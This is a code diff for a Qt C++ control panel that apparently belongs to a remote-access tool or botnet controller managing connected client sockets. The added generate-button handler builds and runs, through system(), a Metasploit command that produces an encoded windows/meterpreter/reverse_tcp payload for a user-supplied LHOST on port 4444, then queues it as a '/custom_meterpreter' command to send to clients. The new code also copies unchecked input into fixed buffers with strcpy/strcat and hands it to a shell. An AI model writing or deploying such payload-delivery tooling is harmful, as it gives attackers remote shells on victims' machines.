@@ -19,8 +19,11 @@ int msend(LPVOID pointerToObject, char msendbuf[1024]);
 char* mrecv(bool show);
 int change_client(int client);
 int mexit();
+std::string readTextFromFile(char* filename);
+std::string enc(std::string data);
 
 extern int currentclient;
+extern int verbose;
 extern SOCKET ClientSocket;
 
 QTTEST::QTTEST(QWidget *parent)
@@ -99,8 +102,37 @@ void QTTEST::on_beepButton_clicked() {
 
 void QTTEST::on_listWidget_itemSelectionChanged() {
 
-    int nm = (ui.listWidget->currentIndex().row()) + 1;
-    change_client(nm);
+	std::string e = ui.listWidget->item((ui.listWidget->currentIndex().row()))->text().toStdString();
+    char tab2[1024];
+    strcpy(tab2, e.c_str());
+	if (verbose == 1)
+	{
+		std::cout<<"CHANGED CLIENT TO: "<<tab2[0]<<"\n";
+	}
+    change_client(atoi(&tab2[0]));
+
+}
+
+void QTTEST::on_generateButton_clicked()
+{
+    std::string generate_text = (ui.generateEdit->text()).toLocal8Bit().constData();
+    char *cstr = new char[generate_text.length() + 1];
+    strcpy(cstr, generate_text.c_str());
+	char part1[280] = "ruby c:/metasploit/apps/pro/msf3/msfpayload windows/meterpreter/reverse_tcp LHOST=";
+	char part2[] = " LPORT=4444 R | ruby c:/metasploit/apps/pro/msf3/msfencode -a x86 -e x86/alpha_mixed BufferRegister=EAX -t raw -o pay.txt";
+	strcat(part1, cstr);
+	strcat(part1, part2);
+	std::cout<<part1<<"\n";
+	system(part1);
+	std::string unenc = readTextFromFile("pay.txt");
+	std::string encd = enc(unenc);
+	char arg[700] = "/custom_meterpreter ";
+	strcat(arg, encd.c_str());
+	ui.sendEdit->setText(arg);
+}
+
+void QTTEST::on_generateEdit_returnPressed()
+{
 
 }
 
